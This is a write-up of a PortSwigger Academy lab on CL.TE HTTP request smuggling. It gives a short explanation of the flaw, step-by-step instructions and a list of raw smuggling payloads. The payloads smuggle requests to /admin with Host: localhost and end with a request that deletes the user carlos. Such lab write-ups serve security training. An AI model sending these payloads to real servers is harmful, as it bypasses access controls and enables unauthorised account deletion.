# Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

**Official lab:** [https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

## Lab idea

The challenge demonstrates a CL.TE parsing disagreement in a two-server chain and its effect on front-end access restrictions. It practices recognizing how inconsistent request boundaries can undermine controls enforced only at the proxy.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Try to visit /admin and observe that the request is blocked.
2. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 37…
3. Observe that the merged request to /admin was rejected due to not using the header Host: localhost .
4. Issue the following request twice: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 54 Transfer-Encoding: chunked 0…
5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type…
7. Observe that you can now access the admin panel.
8. Using the previous response as a reference, change the smuggled request URL to delete carlos : POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type…

## Payloads / key values
- `/admin`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 37 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-Ignore: X`
- `Host: localhost`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 54 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost X-Ignore: X`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=`
- `carlos`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=`

## Official source
- [PortSwigger Academy: Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
